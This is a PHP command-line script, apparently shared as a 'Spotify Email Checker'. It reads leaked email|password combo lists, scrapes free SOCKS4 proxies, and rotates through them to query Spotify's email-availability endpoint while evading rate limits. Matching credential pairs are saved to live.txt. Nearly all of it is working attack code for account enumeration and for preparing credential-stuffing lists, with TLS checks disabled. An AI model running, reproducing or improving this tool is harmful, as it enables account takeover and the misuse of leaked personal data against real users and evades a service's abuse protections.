<?php 
function cover(){
    echo "\t\t==========================================\n";
    echo "\t\t== Spotify Email Checker + Socks4 Proxy ==\n";
    echo "\t\t===========  by nDLnTm  ==================\n";
    echo "\t\t==========================================\n\n";
}
function get_proxy(){

    $ci = curl_init();
    curl_setopt($ci, CURLOPT_URL, 'https://www.socks-proxy.net/');
    curl_setopt($ci, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ci, CURLOPT_FOLLOWLOCATION, true);

    $response = curl_exec($ci);
    preg_match_all('/<tr><td>(.*)<\/td>/s', $response, $matches);
    $match = $matches[0][0];
    global $hhh;
    $hhh = explode('<tr><td>', $match);
    global $ip,$port,$country,$proxyyy,$type;
    $proxyyy = array();
    $cp = 0;
    foreach ($hhh as $key => $value) {
            $haha = explode('</td><td>', $value);
            
            $ip = $haha[0];
            $port = $haha[1];
            $country = $haha[2];
            $country = $country[0].$country[1];
            if ($country != "US" and !empty($country) and !empty($ip)) {
                # code...
                #echo " \tSOCKS4 ====> $ip:$port=>$country\n\n";
                $type = CURLPROXY_SOCKS4;
                $proxyyy[$cp] = $ip.":".$port;
            echo "\t$haha[0]:$haha[1]==>$country\n";
            $cp++;
            } #else{
                #$type = 7;
            #}
            
        
        }
        echo "\n\tTotal socks4 : ".count($proxyyy)."\n";
        #echo $response;
    curl_close($ci); 
}
function search($line, $delim){
    $line = str_replace(" ", "", $line);
    $line = explode($delim, $line);
    $i    = 0;

    while ($i < count($line)) {
        if (1==1) {/**!strpos($line[$i], '@') && !strpos($line[$i], '.')**/
            $mail = $line[$i];
            $pass = $line[$i + 1];
            $i    = 10000;
            if ($pass == "") {
                $pass = $line[$i - 1];
            }
        }
        $i++;
    }
    
    $line = $mail . "|" . $pass;
    $line = explode('|', $line);
    return $line;
}
function cek_spotify($ml,$pry,$tpe){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.spotify.com/id/xhr/json/isEmailAvailable.php?email=' . $ml);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_PROXY, $pry);
    curl_setopt ($ch, CURLOPT_PROXYTYPE, $tpe);
    curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13');
    curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIESESSION, true);
    // curl_setopt($ch, CURLOPT_POST, 1);
    // curl_setopt($ch, CURLOPT_POSTFIELDS,
    //         "postvar1=value1&postvar2=value2&postvar3=value3");
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
    curl_setopt($ch, CURLOPT_TIMEOUT, 100);
    $cekme = curl_exec($ch);
    #echo $cekme."\n";
    #echo $pry;
    $err = curl_error($ch);
    if($err){
        echo "$err\n";
    }
    global $cek;
    if(preg_match('/false/i', $cekme)){
        $cek = 'live';
    }else if(preg_match('/error/i', $cekme)or (empty($cekme))){
        $cek = 'error';
    }else{
        $cek = 'die';
    }
    curl_close($ch);

}


cover();
if (isset($argv[1])) {
    # code...
    $open=fopen($argv[1], "r");
    $data =fread($open,filesize($argv[1]));
    $delim = "|";
    $extract = explode("\n", $data);
    #$proxy = "";
    get_proxy();
    $x = 0;
     $proxy = $proxyyy[$x];
    //$proxy = "";
    #echo "\t$proxy\n";
    foreach ($extract AS $k => $line) {

        $i++;
        if (strpos($line, '=>') !== false) {
            $line = str_replace('=>', '|', $line);
        }
        if (strpos($line, ']') !== false) {
            $line = str_replace('=>', '|', $line);
        }
        if (strpos($line, '[') !== false) {
            $line = str_replace('=>', '|', $line);
        }

        $info = search(trim($line), $delim);
        $mail = trim($info[0]);
        $pass = $info[1];

        
        if ($x >= count($proxyyy) ) {
            # code...
            get_proxy();
            $x = 0;
            $proxy = $proxyyy[$x];
            echo "\t$proxy\n";

        } else {
            # code...
            #echo "\t Checking $mail => ";
            cek_spotify($mail,$proxy,$type);
            if ($cek == 'live') {
        # code...
            echo "\tLIVE ===> $mail | $pass\n";
            $live=fopen("live.txt", "a");
            fwrite($live, "\n[+] LIVE  ==> ".$mail." | ".$pass." | [SPOTIFY]");
            fclose($live) ;
            }else if($cek == 'error'){
                echo "\tLIMIT ERROR BRO \n\n";
        
                while ($cek == 'error') {
                    $x++;
                    $proxy = $proxyyy[$x];
                    echo "\t$proxy\n";
                    cek_spotify($mail,$proxy,$type);
                    
                    if ($cek == 'live') {
                        echo "\tLIVE ===> $mail | $pass\n";
                        $live=fopen("live.txt", "a");
                        fwrite($live, "\n[+] LIVE  ==> ".$mail." | ".$pass." | [SPOTIFY]");
                        fclose($live) ;
                    }else{
                        echo "\tPROXY KURANG BAGUS BROO / LIMIT ERROR\n";
                    }
                    if ($x >= count($proxyyy)) {
                        # code...
                        get_proxy();
                        $x = 0;
                        $proxy = $proxyyy[$x];
                        echo "\t$proxy\n";
                    }
                }
            }else{
                echo "\tDIE  ===> $mail\n";
            }
        }
        
    }
}


 ?>